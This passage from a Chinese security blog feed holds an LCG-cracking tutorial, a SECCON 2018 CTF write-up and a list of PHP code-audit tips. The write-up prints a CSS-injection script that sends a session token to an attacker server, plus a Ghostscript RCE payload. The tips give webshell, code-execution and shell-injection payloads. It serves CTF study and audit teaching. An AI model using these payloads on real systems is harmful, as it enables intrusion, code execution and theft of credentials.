&quot;模数&quot; def __init__(self, seed): self.state = seed # the &quot;seed&quot; def next(self): self.state = (self.state * self.m + self.c) % self.n return self.statedef test(): gen = prng_lcg(123) # seed = 123 print gen.next() # 第一个生成值 print gen.next() # 第二个生成值 print gen.next() # 第三个生成值 3.LCG的优缺点LCG目前是分流行，得益于其在数学表达实现上十分优雅、非常容易理解并且容易设计实现、计算速度可以非常快。但是它也存在一些缺点，比如它在加密安全性方面十分弱。接下来将从以下几种情况对其进行攻击。 0x02 攻击LCG1. 对于A、B、M以及N0已知的情况假设我们观察到有一个LCG系统产生了以下三组连续的值，并且我们知道内部的参数如下: 1234# 三组连续的值s0 = 2300417199649672133s1 = 2071270403368304644s2 = 5907618127072939765 1234# 内部的参数m = 672257317069504227 # the &quot;multiplier&quot;c = 7382843889490547368 # the &quot;increment&quot;n = 9223372036854775783 # the &quot;modulus&quot; 在已知了这些参数之后我们可以很快的推算出未来的数值或者之前的某个数值，所以还是存在安全问题的。 123456789101112131415161718192021222324In [1]: m = 672257317069504227In [2]: c = 7382843889490547368In [3]: n = 9223372036854775783In [4]: s0 = 2300417199649672133In [5]: s1 = (s0*m + c) % nIn [6]: s2 = (s1*m + c) % nIn [7]: s3 = (s2*m + c) % nIn [8]: s4 = (s3*m + c) % nIn [9]: s1Out[9]: 2071270403368304644LIn [10]: s2Out[10]: 5907618127072939765LIn [11]: s3Out[11]: 5457707446309988294L 2.增量未知我们不清楚增量，但是我们知道以下信息: 123m = 81853448938945944c = # unknownn = 9223372036854775783 123# 初值和第一个计算值s0 = 4501678582054734753s1 = 4371244338968431602 我们稍稍改写下公式就可以将目标c计算出来 123s1 = s0*m + c (mod n)c = s1 - s0*m (mod n) 此种类型Python攻击代码如下所示: 12345def crack_unknown_increment(states, modulus, multiplier): increment = (states[1] - states[0]*multiplier) % modulus return modulus, multiplier, incrementprint crack_unknown_increment([4501678582054734753, 4371244338968431602], 9223372036854775783, 81853448938945944) 3.增量和乘数都未知我们虽然不知道增量和乘数但是我们知道以下数值 123m = # unknownc = # unknownn = 9223372036854775783 1234# LCG生成的初值和后面生成的两个值s0 = 6473702802409947663s1 = 6562621845583276653s2 = 4483807506768649573 解决办法很简单，想想怎么解线性方程组就好了 123456s_1 = s0*m + c (mod n)s_2 = s1*m + c (mod n)s_2 - s_1 = s1*m - s0*m (mod n)s_2 - s_1 = m*(s1 - s0) (mod n)m = (s_2 - s_1)/(s_1 - s_0) (mod n) 此种类型Python攻击代码如下所示: 12345def crack_unknown_multiplier(states, modulus): multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus return crack_unknown_increment(states, modulus, multiplier)print crack_unknown_multiplier([6473702802409947663, 6562621845583276653, 4483807506768649573], 9223372036854775783) 这个算法中应用到了求模，所以我们就需要逆推。详情参考: Recursive algorithm 1234567891011def egcd(a, b): if a == 0: return (b, 0, 1) else: g, x, y = egcd(b % a, a) return (g, y - (b // a) * x, x)def modinv(b, n): g, x, _ = egcd(b, n) if g == 1: return x % n 4.增量，乘数和模数均未知现在内部状态基本是都不知道了，但是我们知道初值和随后LCG产生的连续的几个值。 123m = # unknownc = # unknownn = # unknown 1234567s0 = 2818206783446335158s1 = 3026581076925130250s2 = 136214319011561377s3 = 359019108775045580s4 = 2386075359657550866s5 = 1705259547463444505s6 = 2102452637059633432 这次用线性方程式不好解决的了，因为对于每一个方程，我们是不知道前一个模数，因此我们将形成的每个方程都会引入新的未知量： 123s1 = s0*m + c (mod n)s2 = s1*m + c (mod n)s3 = s2*m + c (mod n) 123s1 - (s0*m + c) = k_1 * ns2 - (s1*m + c) = k_2 * ns3 - (s2*m + c) = k_3 * n 这就相当于六个未知数和三个方程。所以线性方程组是不可能行得通的了，但是数论里面有一条很有用:如果有几个随机数分别乘以n，那么这几个数的欧几里德算法(gcd)就很可能等于n。 1234In [944]: n = 123456789In [945]: reduce(gcd, [randint(1, 1000000)*n, randint(1, 1000000)*n, randint(1, 1000000)*n])Out[945]: 123456789 某些取模运算是会等于0的 1X = 0 (mod n) 然后，根据定义，这相当于： 1X = k*n 所以这种X != 0但是X = 0 (mod n)的情况就很有趣。我们只需要取几个这样的值进行gcd运算，我们就可以解出n的值。这种是在模数未知的情况下十分常用的方法。 我们在此引入一个序列 – T(n) = S(n+1) - S(n): 1234t0 = s1 - s0t1 = s2 - s1 = (s1*m + c) - (s0*m + c) = m*(s1 - s0) = m*t0 (mod n)t2 = s3 - s2 = (s2*m + c) - (s1*m + c) = m*(s2 - s1) = m*t1 (mod n)t3 = s4 - s3 = (s3*m + c) - (s2*m + c) = m*(s3 - s2) = m*t2 (mod n) 之后我们就可以得到我们想要的效果了: 1t2*t0 - t1*t1 = (m*m*t0 * t0) - (m*t0 * m*t0) = 0 (mod n) 然后我们就可以生成几个这样模是0的值，进而利用我们上文讲述的技巧，此种类型Python攻击代码如下所示: 12345678def crack_unknown_modulus(states): diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] modulus = abs(reduce(gcd, zeroes)) return crack_unknown_multiplier(states, modulus)print crack_unknown_modulus([2818206783446335158, 3026581076925130250, 136214319011561377, 359019108775045580, 2386075359657550866, 1705259547463444505]) 0x03 总结此处我们简述了对LCG的攻击方式，这种方式刚在P.W.N CTF中出现过，具体的题目以及解答可以参考我的下一篇文章–《P.W.N. CTF》中的LCG and the X题目解析。 0x04 参考Cryptographically secure pseudorandom number generator Lenstra–Lenstra–Lovász lattice basis reduction algorithm Cracking RNGs: Linear Congruential Generators Algorithm Implementation/Mathematics/Extended Euclidean algorithm 线性同余方法]]></content>
  </entry>
  <entry>
    <title><![CDATA[SECCON 2018 Qualis GhostKingdom]]></title>
    <url>%2F2018%2F10%2F29%2FSECCON-2018-Qualis-GhostKingdom%2F</url>
    <content type="text"><![CDATA[0x00 问题分析题目链接: 1http://ghostkingdom.pwn.seccon.jp/FLAG/ 访问链接后的提示如下: 1FLAG is somewhere in this folder. GO TO TOP 首先是一个登录界面: 一通操作后发现没有注入，所以跟着逻辑注册登录继续往下看。 登录后发现侧面有三个功能，但是上传功能被禁止了，标识只有从本地登录才可以使用。尝试修改xxf等方式并没有成功，所以猜测可能是cookie认证问题？ 但或者上传处不是关键点，先从上面两个功能开始测试。首先测试Message to admin，刚开始猜测可能此处会不会有一个xss bot，打个cookie回来。虽然这个输入框也不存在xss，也没有bot周期性地戳一下，但是在burp抓包中分析到一个css参数可控。联想到可能是CSS 注入读数据这个点，但是我还缺少一个从本地戳戳戳的bot！ 此处我们decode一下这个base64可以看到是控制此处的输出样式。 12 zeroyu@zeros  ~/Desktop  echo -n &quot;c3BhbntiYWNrZ3JvdW5kLWNvbG9yOnJlZDtjb2xvcjp5ZWxsb3d9&quot; | base64 -Dspan&#123;background-color:red;color:yellow&#125; 点击send to admin之后我看到一个csrf参数(有用？) 好像无法但从这一个点入手，所以我决定看看Take a screenshot。 很明显是一个ssrf,不过file等协议都被限制了，302跳转好像也没开。虽然限制了127等，但是我们可以通过访问http://0/绕过，结果还是有惊喜的。 PS:扫描过程中发现了一个有趣的东西 1http://ghostkingdom.pwn.seccon.jp/ghostMagick.cgi 小结: 本来我以为这题是三个点分别突破都可以获取flag，但现在看来不行，真是继承了KeigoYAMAZAKI一贯的出题风格，要综合以上信息，构造利用链来读取flag 0x01 解题步骤首先Take a screenshot处的ssrf可以让我们从local network那里进行登录，登录之后可以操作Upload image。 但是仅通过这个有限制的ssrf无法进一步利用了。所以换一个角度考虑，如果我们能够从local network获取CGISESSID在from internet进行登录就可以使用Upload image功能了呢？ 有了这个思路接下来就是获取CGISESSID了，联想到Message to admin还有一个css inject可以用来读取数据，所以就可以ssrf+css inject联合来获取CGISESSID。 此处可以参考: Reading Data via CSS Injection 服务器上使用php开个服务器来记录数据1php -S 0.0.0.0:2333 对应的目录下可以放置如下log.php来帮助记录123456789101112&lt;?phpdate_default_timezone_set(&apos;Asia/Shanghai&apos;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&apos;PHP_SELF&apos;]; //访问者要访问的文件名$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time = date(&apos;Y-m-d H:i:s&apos;,time()); //访问时间$logadd = &apos;来访时间：&apos;.$time.&apos;--&gt;&apos;.&apos;访问链接：&apos;.&apos;http://&apos;.$ip.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt; 利用脚本如下:123456789101112import base64CHARLIST = &quot;0123456789&quot; + &quot;abcdef&quot;URL = &quot;http://0/?msg=master&amp;action=msgadm2&amp;css=&quot;#known = &quot;bcc703c0693e6eff894ede&quot;buf = &quot;&quot;for char in CHARLIST: buf += &quot;&quot;&quot;input[name=&quot;csrf&quot;][value^=&quot;&#123;&#125;&quot;] &#123;&#123;background: url(http://your server ip/log.php/&#123;&#125;);&#125;&#125;&quot;&quot;&quot;.format(known+char,known+char)print(URL + base64.b64encode(buf.encode(&apos;utf-8&apos;)).decode(&apos;utf-8&apos;)) 最终可以获取CGISESSID的值 之后在浏览器中设置上我们获得的CGISESSID，就可以使用Upload image功能了。 测试一下 发现有个Convert to GIF format结合之前我们发现的ghostMagick.cgi很容易想到Ghostscript的rce漏洞。我们将以下代码保存为jpg，上传可以得flag。 123456%!PSuserdict /setpagedevice undeflegal&#123; null restore &#125; stopped &#123; pop &#125; iflegalmark /OutputFile (%pipe%cat /var/www/html/FLAG/FLAGflagF1A8.txt) currentdevice putdeviceprops SECCON{CSSinjection+GhostScript/ImageMagickRCE} 0x03 参考https://graneed.hatenablog.com/entry/2018/10/28/150722]]></content>
  </entry>
  <entry>
    <title><![CDATA[PHP代码审计中的一些Tips]]></title>
    <url>%2F2018%2F10%2F13%2Fphp-audit-tips%2F</url>
    <content type="text"><![CDATA[1.eregi此函数可以被%00截断 比如下面这个例子，可以使用$b=”%001111” 12345//%00好像算一个字节if(strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125; 此外，如果传入数组，函数会报错并返回NULL。 2.assertPHP中的assert可以用来执行PHP函数，进而进行getshell等操作，比如我们利用如下代码进行目录扫描 12345&lt;?php $poc = &quot;a#s#s#e#r#t&quot;;$poc_1 = explode(&quot;#&quot;, $poc);$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5];$poc_2($_GET[&apos;s&apos;])?&gt; payload s=print_r(scandir(&#39;./&#39;)); 3.md5&amp;sha1PHP中的md5和sha1函数存在两个问题，第一是他们处理数组都返回null；第二在弱类型条件下他们会认为如下的返回值相同 1234567891011QNKCDZO240610708s878926199as155964671as214587387as214587387a sha1(str)sha1(&apos;aaroZmOk&apos;) sha1(&apos;aaK1STfY&apos;)sha1(&apos;aaO8zKZF&apos;)sha1(&apos;aa3OFF9m&apos;) 注意：如果使用了md5并且是强相等，那么找到数据对应md5相同的值即可，在此给出一组某强网杯使用过的数据 123$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;#008ee33a9d58b51cfeb425b0959121c9 此外我们观察定义可以得到另外一点，通过设置raw_output参数的值为true，我们可以达到一个\，从而进行sql注入 string md5 ( string $str [, bool $raw_output = false ] ) str原始字符串。 raw_output如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。 1234567891011121314php &gt; var_dump(md5(128,true));string(16) &quot;v�an���l���q��\&quot;//可以看到字符串ffifdyop被md5后会产生&apos;or&apos;，从而可以产生万能密码进行登录php &gt; echo md5(&quot;ffifdyop&quot;,true);&apos;or&apos;6�]��!r,��bphp &gt; echo md5(&quot;129581926211651571912466741651878684928&quot;,true);�T0D��o#��&apos;or&apos;8content: 129581926211651571912466741651878684928count: 18933549hex: 06da5430449f8f6f23dfc1276f722738raw: ?T0D??o#??&apos;or&apos;8.N=? 参考: SQL injection with raw MD5 hashes 4.strcmp注：5.3之前版本的php存在如下问题 当这个函数接受到了不符合的类型，这个函数将发生错误并返回0，因而可以使用数组绕过验证 12345678910&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&apos;a&apos;])) &#123;if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。//比较两个字符串（区分大小写）die(&apos;Flag: &apos;.$flag);elseprint &apos;No&apos;;&#125;?&gt; 5.eregereg()函数只能处理字符，如果传入数组将返回null 6.strposstrpos()的参数不能够是数组，所以处理数组返回的是null strpos()与PHP的自动类型转换结合也会出在哪问题 如下： 12var_dump(strpos(&apos;abcd&apos;,&apos;a&apos;)); # 0var_dump(strpos(&apos;abcd&apos;,&apos;x&apos;)); # false 并且由于PHP的自动类型转换的关系，0和false是相等的 1var_dump(0==false); # true 例题： 1234567891011121314151617181920class Login &#123; public function __construct($user, $pass) &#123; $this-&gt;loginViaXml($user, $pass); &#125; public function loginViaXml($user, $pass) &#123; if ( (!strpos($user, &apos;&lt;&apos;) || !strpos($user, &apos;&gt;&apos;)) &amp;&amp; (!strpos($pass, &apos;&lt;&apos;) || !strpos($pass, &apos;&gt;&apos;)) ) &#123; $format = &apos;&lt;xml&gt;&lt;user=&quot;%s&quot;/&gt;&lt;pass=&quot;%s&quot;/&gt;&lt;/xml&gt;&apos;; $xml = sprintf($format, $user, $pass); $xmlElement = new SimpleXMLElement($xml); // Perform the actual login. $this-&gt;login($xmlElement); &#125; &#125;&#125;new Login($_POST[&apos;username&apos;], $_POST[&apos;password&apos;]); 传入的username和password的首位字符是&lt;或者是&gt;就可以绕过限制，那么最后的pyaload就是： 1username=&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;password=&lt;&quot;&gt;&lt;injected-tag%20property=&quot; 最终传入到$this-&gt;login($xmlElement)的$xmlElement值是&lt;xml&gt;&lt;user=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;pass=&quot;&lt;&quot;&gt;&lt;injected-tag property=&quot;&quot;/&gt;&lt;/xml&gt;这样就可以进行注入了。 7.is_numericis_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。 此外，is_numeric()函数在判断是否是数字时会忽略字符串开头的’ ‘、’\t’、’\n’、’\r’、’\v’、’\f’。而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\r\n\t 0.1e2”) &gt;&gt; TRUE 8.ordord()函数返回字符串的首个字符的 ASCII 值 例如下面这道题目，我们可以用16进制绕过限制 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag = &apos;flag&#123;test&#125;&apos;;$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值$nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值$number = &apos;3735929054&apos;;// Check all the input characters!for ($i = 0; $i &lt; strlen($number); $i++)&#123;// Disallow all the digits!$digit = ord($temp&#123;$i&#125;);if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&#123;// Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number == $temp)return $flag;&#125;$temp = $_GET[&apos;password&apos;];echo noother_says_correct($temp);?&gt; 9.科学计数法123strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999payload==&gt;1e9 10.in_array语法：in_array(search,array,type) 参数 描述 search 必需。规定要在数组搜索的值。 array 必需。规定要搜索的数组。 type 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 注意：in_array()的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。 例如如下代码在13 行存在任意文件上传漏洞。 在 12 行代码通过 in_array() 来判断文件名是否为整数，可是未将 in_array() 的第三个参数设置为 true 。in_array()的第三个参数在默认情况下是false，因此 PHP 会尝试将文件名自动转换为整数再进行判断，导致该判断可被绕过。比如使用文件名为 5vulnspy.php 的文件将可以成功通过 in_array($this-&gt;file[&#39;name&#39;], $this-&gt;whitelist) 判断，从而将恶意的 PHP 文件上传到服务器。 123456789101112131415161718192021class Challenge &#123; const UPLOAD_DIRECTORY = &apos;./solutions/&apos;; private $file; private $whitelist; public function __construct($file) &#123; $this-&gt;file = $file; $this-&gt;whitelist = range(1, 24); &#125; public function __destruct() &#123; if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123; move_uploaded_file( $this-&gt;file[&apos;tmp&apos;], self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;] ); &#125; &#125;&#125;$challenge = new Challenge($_FILES[&apos;solution&apos;]); 测试 123$myarray = range(1,24); in_array(&apos;5vulnspy.php&apos;,$myarray); //truein_array(&apos;5vulnspy.php&apos;,$myarray,true); //false 注:array_search()与in_array()也是一样的问题。 11.filter_varfilter_var()的URL过滤非常的弱，只是单纯的从形式上检测并没有检测协议。测试如下： 1234var_dump(filter_var(&apos;vulnspy.com&apos;, FILTER_VALIDATE_URL)); # falsevar_dump(filter_var(&apos;http://vulnspy.com&apos;, FILTER_VALIDATE_URL)); # http://vulnspy.comvar_dump(filter_var(&apos;xxxx://vulnspy.com&apos;, FILTER_VALIDATE_URL)); # xxxx://vulnspy.comvar_dump(filter_var(&apos;http://vulnspy.com&gt;&apos;, FILTER_VALIDATE_URL)); # false 这种情况下可以采用如下payloadjavascript://comment%250aalert(1)来触发XSS 注：%250a即%0a表示换行符，上面的payload会被换行，并且//表示注释。最终触发后将得到如下形式 12javascript://commentalert(1) 12.class_exist以class_exist()为例的下列函数会在在PHP 5.4以下版本中存在任意文件包含漏洞 1234567891011121314151617call_user_func()call_user_func_array()class_exists()class_implements()class_parents()class_uses()get_class_methods()get_class_vars()get_parent_class()interface_exists()is_a()is_callable()is_subclass_of()method_exists()property_exists()spl_autoload_call()trait_exists() 注：class_exists()会检查是否存在对应的类，当调用class_exists()函数时会触发用户定义的autoload()函数，用于加载找不到的类(这个特性是因为class_exists函数中的$autoload参数，默认是true造成的)。所以如果我们输入../../../../etc/passwd是，就会调用class_exists()，这样就会触发autoload(),这样就是一个任意文件包含的漏洞了。 注: PHP5~5.3(包含5.3版本)版本 之间才可以使用路径穿越符号”../“。 此外，还存在一个blind xxe的漏洞，由于存在class_exists()，所以我们可以调用PHP的内置函数,并且通过$controller = new $controllerName($data);进行实例化。借助与PHP中的SimpleXMLElement类来完成XXE攻击。 xxe漏洞实例参考： shopware blind xxe 我是如何黑掉“Pornhub”来寻求乐趣和赢得10000$的奖金 参考：stackoverflow:class_exists&amp;autoload： 13.mailmail()中的第五个参数可以-X的方式写入webshell。 payload：`example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php` 这个PoC的功能是在Web目录中生成一个PHP webshell。该文件（rce.php）包含受到PHP代码污染的日志信息 escapeshellarg()和filter_var()不安全的问题参考在PHP应用程序开发中不正当使用mail()函数引发的血案 escapeshellarg和escapeshellcmd联合使用从而造成的安全问题参考PHP escapeshellarg()+escapeshellcmd() 之殇 14.正则表达式可能存在问题(1)如本意想将非a-z、.、-、全部替换为空，但是正则表达式写成了`[^a-z.-]`，其中没有对-进行转义，那么-表示一个列表，例如[1-9]表示的数字1到9，但是如果[1-9]表示就是字母1、-和9。所以[^a-z.-_]表示的就是非ascii表中的序号为46至122的字母替换为空。那么此时的../…/就不会被匹配，就可以进行目录穿越，从而造成任意文件删除了。 (2)在反序列化漏洞中对于preg_match(&#39;/O:\d:/&#39;, $data)这样的正则可以采用在对象长度前添加一个+号，即o:14-&gt;o:+14来进行绕过。 参考：php反序列unserialize的一个小特性 15.parse_strparse_str()可以在参数可控的情况下可以造成变量覆盖漏洞 例如： 12$var = parse_url($_SERVER[&apos;HTTP_REFERER&apos;]);parse_str($var[&apos;query&apos;]); 16.preg_replacepreg_replace() /e 模式可以执行任意代码，例子如下 12345678910111213header(&quot;Content-Type: text/plain&quot;);function complexStrtolower($regex, $value) &#123; return preg_replace( &apos;/(&apos; . $regex . &apos;)/ei&apos;, &apos;strtolower(&quot;\\1&quot;)&apos;, $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . &quot;\n&quot;;&#125; preg_replace的参数含义参考 PHP手册–preg_replace 在此处我们可以看到有两处的值是我们可以操控的，但是只有在’strtolower(“\1”)’这个位置的参数才可以执行代码，所以关键就在这儿。 \1是具有特殊含义的，在这儿就是就是指定第一个子匹配项,也即${phpinfo()}，进而达到执行代码的目的 参考文章： 深入研究preg_replace与代码执行 后向引用 一个PHP正则相关的“经典漏洞” 17.str_replacestr_replace()函数是单次替换而不是多次替换，因而可以通过双写敏感词汇过滤，例如： 12str_replace(&apos;../&apos;, &apos;&apos;, $language);//payload:..././或者....// 18.header使用header()进行跳转的时候没有使用exit()或者是die()，导致后续的代码任然可以执行。如果后面存在危险函数，那么将会触发漏洞。 例如： 12345678910111213141516extract($_POST);function goAway() &#123; error_log(&quot;Hacking attempt.&quot;); header(&apos;Location: /error/&apos;);&#125;if (!isset($pi) || !is_numeric($pi)) &#123; goAway();&#125;if (!assert(&quot;(int)$pi == 3&quot;)) &#123; echo &quot;This is not pi.&quot;;&#125; else &#123; echo &quot;This might be pi.&quot;;&#125; 此处就可以POST一个pi=phpinfo()来借助assert()函数触发代码执行漏洞 19.intval特性1: intval()函数执行成功时返回 变量的10进制值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 特性2: 整数溢出、向下取整和整形判断存在问题 (1)整数溢出 32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807。因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647 (2)向下取整 intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入 (3)intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\0）时结束转换 特性3: intval()函数会忽略’’ ‘\n’、’\r’、’\t’、’\v’、’\0’ ，也就是说intval(“\r\n\t 12”) &gt;&gt; 12 20.htmlentitieshtmlentities默认情况下不会对单引号进行转义。 21.addslashes在进行了addslashes之后进行了截断，在一些情况下就有可能能够获得一个引号。 比如： 1234567891011function sanitizeInput($input, $length = 20) &#123; $input = addslashes($input); if (strlen($input) &gt; $length) &#123; $input = substr($input, 0, $length); &#125; return $input;&#125;$test = &quot;1234567890123456789&apos;&quot;;var_dump(sanitizeInput($test));//output:1234567890123456789\ 此处输出的刚好是带有一个\，而’则因为长度限制被截断，从而可以出发SQL注入漏洞 22.小特性(1)php自身在解析请求的时候，如果参数名字中包含空格、.、[这几个字符，会将他们转换成_。但是通过$_SERVER[&#39;REQUEST_URI&#39;]方式获得的参数并不会进行转换。 (2)$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果 参考： 《request导致的安全性问题分析》 《PHP的两个特性导致waf绕过注入》 (3)PHP中的&quot;&quot;是可以执行代码的，因而在payload中常采用&quot;&lt;?php phpinfo();&gt;&quot; 23. ++PHP中的自增符号++在如下情况中不会有任何意义 1$test=123; echo $test++; # 123 因此像下面代码所示的一样，就可能回产生变量覆盖漏洞 1234foreach ($input as $field =&gt; $count) &#123; $this-&gt;$field = $count++;&#125;//这里的$count++在此并没有立即对值进行了修改 提示：当然如果++$count形式的话，也是可以存在变量覆盖的，因为在进行++操作时会进行隐式类型转换，如果能够转换成功，则会进行加法操作；如果不能转换成功，则将最后一个字符进行加法操作。 示例： 12345678$test = 123; echo ++$test; // 124$test = &apos;123&apos;; echo ++$test; // 124$test = &apos;1ab&apos;; echo ++$test; // &apos;1ac&apos;$test = &apos;ab1&apos;; echo ++$test; // &apos;ab2&apos;$test = &apos;a1b&apos;; echo ++$test; // &apos;a1c&apos;$test =array(2,&apos;name&apos;=&gt;&apos;wyj&apos;); echo ++$test; //Array123//所以我们构造shell.php4或者shell.pho这样的，在自增操作后就会变成我们想要的shell.php5或者shell.php 24.openssl_verify依据openssl_verify()的定义有 如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1. 如果单独采用如下形式的判断就会出现问题，因为if判断只有遇到0或者是false返回的才是false。 1234if (openssl_verify($data, $signature, $pub)) &#123; $object = json_decode(base64_decode($data)); $this-&gt;loginAsUser($object);&#125; 25.stripcslashesstripcslashes函数 返回反转义后的字符串。可识别类似 C 语言的 \n，\r，… 八进制以及十六进制的描述。 1var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;)); // 0;sleep 5; 因而对于下面这种形式我们可以采用将命令转换为八进制的形式进行绕过正则判断并触发命令执行 1234567891011function createThumbnail() &#123; $e = stripcslashes( preg_replace( &apos;/[^0-9\\\]/&apos;, &apos;&apos;, isset($_GET[&apos;size&apos;]) ? $_GET[&apos;size&apos;] : &apos;25&apos; ) ); system(&quot;/usr/bin/convert &#123;$this-&gt;file&#125; --resize $e ./thumbs/&#123;$this-&gt;file&#125;&quot;);&#125; 26.set_error_handler若错误配置此函数，将会造成信息泄露进而造成漏洞产生，比如： 123set_error_handler(function ($no, $str, $file, $line) &#123; throw new ErrorException($str, 0, $no, $file, $line);&#125;, E_ALL); 这里的设置就相当于 123error_reporting(E_ALL);ini_set(&apos;display_errors&apos;, TRUE);ini_set(&apos;display_startup_errors&apos;, TRUE); 这种配置将会泄露所有的错误信息 27.declare与array_walk针对PHP7版本 PHP7中引入了declare(strict_types=1);这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用。12345678declare(strict_types=1);function addnum(int $a,int $b) &#123; return $a+$b;&#125;$result = addnum(1,2);var_dump($result); // 输出3$result = addnum(&apos;1&apos;,&apos;2&apos;);var_dump($result); //出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配 但是通过array_walk()调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。1234567declare(strict_types=1);function addnum(int &amp;$value) &#123; $value = $value+1;&#125;$input = array(&apos;3a&apos;,&apos;4b&apos;);array_walk($input,addnum);var_dump($input);//array(4,5) 因此利用array_walk()的这种特性，我们可以传入任意字符进去，进而触发相应的漏洞。 28.ldap_escape string ldap_escape ( string $value [, string $ignore [, int $flags ]] ) value The value to escape. ignore Characters to ignore when escaping. flags The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs. 当使用ldap_search()时需要选择LDAP_ESCAPE_FILTER过滤字符串，但是如果选择LDAP_ESCAPE_DN将会导致过滤无效 29.strip_tags &amp;&amp; preg_replace例如: 1$textMsg = trim(strip_tags(preg_replace(&apos;/&lt;(head|title|style|script)[^&gt;]*&gt;.*?&lt;\/\\1&gt;/s&apos;，&apos;&apos;，$message))); 目的很明显–去掉所有的标签和内容。首先使用preg_replace过滤掉标签、标签内容、标签属性，接着又使用strip_tags去掉其余的html和php标记。 正常输入没问题–如:&lt;head&gt;evil&lt;/head&gt;，得到的结果是空，即全部都被过滤了。 结果很悲惨–如果攻击者输入&lt;head&gt;evil&lt;/headend&gt;或者&lt;he&lt;&gt;ad&gt;evil&lt;/head&gt;之类，就会导致evil字符串逃逸，攻击者利用evil字符串再结合上下文说不定就能够造成漏洞。 30.escapeshellarg &amp;&amp; escapeshellcmd escapeshellarg 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号 escapeshellcmd 会对&amp;#;|*?~&lt;&gt;^()[]{}$\， \x0A 和 \xFF进行转义，’和 “仅在不配对儿的时候被转义 需要注意的是escapeshellarg和escapeshellcmd在win平台和linux平台的表现是不一样的。他们两者造成的漏洞也主要是在Linux平台下。接下来主要是说明在Linux平台下的情况 123$msg = &quot;123&apos;456&quot;;echo escapeshellarg($msg) // 结果是： &apos;123&apos;\&apos;&apos;456&apos;echo escapeshellcmd($msg) // 结果是: 123\&apos;456 当两者混合使用时，就会出现问题。代码如下： 123$parameter1 = escapeshellarg($parameter)$parameter2 = escapeshellcmd($parameter1)system(&quot;curl &quot;.$parameter2) 假设我们传入的$parameter为172.17.0.2&#39; -v -d a=1，那么经过escapeshellarg之后变为&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;。之后经过escapeshellcmd变为&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;，此时\的存在后面得’不会被转义，所以后面的两个’’变为了空白字符。那么最后实际的命令为curl 172.17.0.2\ -v -d a=1&#39;，成功地逃逸了单引号。 